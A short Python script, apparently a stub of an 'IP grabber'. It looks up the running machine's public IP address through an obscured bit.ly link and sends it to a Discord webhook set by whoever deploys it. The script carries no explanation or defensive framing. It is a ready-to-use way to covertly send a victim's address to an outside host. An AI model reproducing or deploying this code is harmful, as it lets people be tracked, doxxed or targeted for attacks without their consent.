import requests 
from base64 import b64decode
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen

webhookurl = 'WEBHOOK HERE'

ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()

webhook = DiscordWebhook(url=f'{webhookurl}', content=f'Ip adress: {ip} \n')
response = webhook.execute()
